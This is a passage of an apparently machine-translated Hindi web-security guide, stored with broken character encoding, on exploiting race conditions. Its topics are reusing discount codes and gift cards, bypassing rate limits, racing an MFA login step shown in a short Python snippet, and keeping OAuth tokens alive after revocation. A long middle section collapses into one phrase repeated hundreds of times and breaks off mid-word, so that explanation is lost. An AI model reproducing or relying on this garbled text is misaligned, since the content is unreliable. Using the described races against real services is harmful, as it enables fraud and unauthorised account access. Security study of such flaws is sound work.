рдпрд╣ рд╕рдмрд╕реЗ рдореМрд▓рд┐рдХ рдкреНрд░рдХрд╛рд░ рдХреА рд░реЗрд╕ рдХрдВрдбреАрд╢рди рд╣реИ рдЬрд╣рд╛рдБ **рдХрдо рд╕рдВрдЦреНрдпрд╛ рдореЗрдВ рдХреНрд░рд┐рдпрд╛ рдХрд░рдиреЗ рдХреА рд╕реАрдорд╛** рд░рдЦрдиреЗ рд╡рд╛рд▓реА **рдХрдордЬреЛрд░рд┐рдпрд╛рдВ** рд╣реЛрддреА рд╣реИрдВред рдЬреИрд╕реЗ рдПрдХ рд╣реА рдбрд┐рд╕реНрдХрд╛рдЙрдВрдЯ рдХреЛрдб рдХреЛ рд╡реЗрдм рд╕реНрдЯреЛрд░ рдореЗрдВ рдХрдИ рдмрд╛рд░ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ред рдПрдХ рдмрд╣реБрдд рд╣реА рд╕рд░рд▓ рдЙрджрд╛рд╣рд░рдг [**рдЗрд╕ рд░рд┐рдкреЛрд░реНрдЯ**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) рдпрд╛ [**рдЗрд╕ рдмрдЧ**](https://hackerone.com/reports/759247) рдореЗрдВ рджреЗрдЦрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рд╣рдорд▓реЛрдВ рдХреЗ рдХрдИ рд░реВрдк рд╣реЛрддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ:

* рдПрдХ рдЧрд┐рдлреНрдЯ рдХрд╛рд░реНрдб рдХреЛ рдХрдИ рдмрд╛рд░ рд░рд┐рдбреАрдо рдХрд░рдирд╛
* рдЙрддреНрдкрд╛рдж рдХреЛ рдХрдИ рдмрд╛рд░ рд░реЗрдЯ рдХрд░рдирд╛
* рдЕрдкрдиреЗ рдЦрд╛рддрд╛ рд╢реЗрд╖ рд░рд╛рд╢рд┐ рд╕реЗ рдЕрдзрд┐рдХ рдирдХрджреА рдирд┐рдХрд╛рд▓рдирд╛ рдпрд╛ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХрд░рдирд╛
* рдПрдХ рд╣реА CAPTCHA рд╕рдорд╛рдзрд╛рди рдХрд╛ рдкреБрдирдГ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛
* рдПрдХ рдПрдВрдЯреА-рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рджрд░ рд╕реАрдорд╛ рдХреЛ рдЫрд▓рдХрд░рдирд╛

### **рдЫрд┐рдкреА рд╣реБрдИ рдЙрдк-рд╕реНрдерд┐рддрд┐рдпрд╛рдБ**

рдЬрдЯрд┐рд▓ рд░реЗрд╕ рдХрдВрдбреАрд╢рди рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдореЗрдВ рдЕрдХреНрд╕рд░ рдЫреЛрдЯреЗ рдЕрд╡рд╕рд░реЛрдВ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдирд╛ рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рдЫрд┐рдкреА рдпрд╛ **рдЕрдирдЬрд╛рди рдорд╢реАрди рдЙрдк-рд╕реНрдерд┐рддрд┐рдпреЛрдВ** рдХреЗ рд╕рд╛рде рдмрд╛рддрдЪреАрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реЛрддреЗ рд╣реИрдВред рдпрд╣рд╛рдБ рдЗрд╕рдХрд╛ рддрд░реАрдХрд╛ рд╣реИ:

1. **рдЫрд┐рдкреА рдЙрдк-рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдХреА рдкрд╣рдЪрд╛рди рдХрд░реЗрдВ**
* рд╕рд░реНрд╡рд╛рдзрд┐рдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдбреЗрдЯрд╛, рдЬреИрд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреНрд░реЛрдлрд╛рдЗрд▓ рдпрд╛ рдкрд╛рд╕рд╡рд░реНрдб рд░реАрд╕реЗрдЯ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдпрд╛ рдмрд╛рддрдЪреАрдд рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-рдЕрдВрддрд░реНрдЧрдд рдЕрдВрдд-
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 рд╢рд╛рд╢реНрд╡рдд рд╕реНрдерд┐рд░рддрд╛

рдХрдИ [**OAUth рдкреНрд░рджрд╛рддрд╛рдПрдВ**](https://en.wikipedia.org/wiki/List\_of\_OAuth\_providers) рд╣реИрдВред рдпреЗ рд╕реЗрд╡рд╛рдПрдВ рдЖрдкрдХреЛ рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдмрдирд╛рдиреЗ рдФрд░ рдкреНрд░рджрд╛рддрд╛ рджреНрд╡рд╛рд░рд╛ рдкрдВрдЬреАрдХреГрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдВрдЧреАред рдЗрд╕рдХреЗ рд▓рд┐рдП **рдЧреНрд░рд╛рд╣рдХ** рдХреЛ рдЕрдкрдиреЗ рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреАред\
рддреЛ, рдпрд╣рд╛рдБ рддрдХ рд╕рд┐рд░реНрдл рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рд▓реЙрдЧрд┐рди рдЧреВрдЧрд▓/рд▓рд┐рдВрдХреНрдбрдЗрди/рдЧрд┐рдердм... рдЬрд╣рд╛рдВ рдЖрдкрдХреЛ рдПрдХ рдкреГрд╖реНрда рдкрд░ рдкреНрд░реЛрдореНрдкреНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд▓рд┐рдЦрд╛ рд╣реЛрддрд╛ рд╣реИ: "_рдПрдкреНрд▓рд┐рдХреЗрд╢рди \<InsertCoolName> рдЖрдкрдХреА рдЬрд╛рдирдХрд╛рд░реА рддрдХ рдкрд╣реБрдВрдЪрдирд╛ рдЪрд╛рд╣рддрд╛ рд╣реИ, рдХреНрдпрд╛ рдЖрдк рдЗрд╕реЗ рдЕрдиреБрдорддрд┐ рджреЗрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ?_"

#### `authorization_code` рдореЗрдВ рд░реЗрд╕ рдХрдВрдбреАрд╢рди

**рд╕рдорд╕реНрдпрд╛** рдЙрддреНрдкрдиреНрди рд╣реЛрддреА рд╣реИ рдЬрдм рдЖрдк рдЗрд╕реЗ **рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рддреЗ рд╣реИрдВ** рдФрд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдПрдХ **`authorization_code`** рдХреЛ рджреБрд░реБрдкрдпреЛрдЧреА рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рднреЗрдЬ рджреЗрддрд╛ рд╣реИред рдлрд┐рд░, рдпрд╣ **рдПрдкреНрд▓рд┐рдХреЗрд╢рди OAUth рд╕реЗрд╡рд╛ рдкреНрд░рджрд╛рддрд╛ рдореЗрдВ рд░реЗрд╕ рдХрдВрдбреАрд╢рди рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЖрдкрдХреЗ рдЦрд╛рддреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╕реЗ рдЕрдзрд┐рдХ AT/RT** (_рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЯреЛрдХрди/рд░рд┐рдлреНрд░реЗрд╢ рдЯреЛрдХрди_) рдХреЛ **`authorization_code`** рд╕реЗ рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХреЗред рдореБрдЦреНрдп рд░реВрдк рд╕реЗ, рдпрд╣ рдЖрдкрдХреЗ рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдХреЗ рдмрд╛рдж рдпрд╣ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛ рдХрд┐ рдЖрдк рдХрдИ рдЦрд╛рддреЗ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред рдлрд┐рд░, рдЕрдЧрд░ рдЖрдк **рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдЕрдкрдиреЗ рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдирд╛ рдмрдВрдж рдХрд░ рджреЗрддреЗ рд╣реИрдВ рддреЛ рдПрдХ рдЬреЛрдбрд╝рд╛ AT/RT рд╣рдЯрд╛ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рд▓реЗрдХрд┐рди рдЕрдиреНрдп рд╡рд╛рд▓рд┐рдб рд░рд╣реЗрдВрдЧреЗ**ред

#### `Refresh Token` рдореЗрдВ рд░реЗрд╕ рдХрдВрдбреАрд╢рди

рдПрдХ рдмрд╛рд░ рдЬрдм рдЖрдкрдиреЗ **рдПрдХ рд╡рд╛рд▓рд┐рдб RT рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рд╣реИ** рддреЛ рдЖрдк рдЗрд╕реЗ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдИ AT/RT рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреБрд░реБрдкрдпреЛрдЧреА рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд▓рд┐рдП рдЕрдкрдиреЗ рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд░рджреНрдж рдХрд░ рджреЗрддрд╛ рд╣реИ рддреЛ рдХрдИ RTs рдЕрднреА рднреА рд╡рд╛рд▓рд┐рдб рд░рд╣реЗрдВрдЧреЗ**ред

## **рд╡реЗрдмрд╕реЙрдХреЗрдЯ рдореЗрдВ RC**

[**WS\_RaceCondition\_PoC**](https://github.com/redrays-io/WS\_RaceCondition\_PoC) рдореЗрдВ рдЖрдк рдПрдХ PoC рдЬрд╛рд╡рд╛ рдореЗрдВ рд╡реЗрдмрд╕реЙрдХреЗрдЯ рд╕рдВрджреЗрд╢ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП **рдкреИрд░рд▓рд▓** рдореЗрдВ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ **рд╡реЗрдм рд╕реЙрдХреЗрдЯ рдореЗрдВ рднреА рд░реЗрд╕ рдХрдВрдбреАрд╢рди**ред

## рд╕рдВрджрд░реНрдн

* [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
* [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
* [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
* [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
* [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди **HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
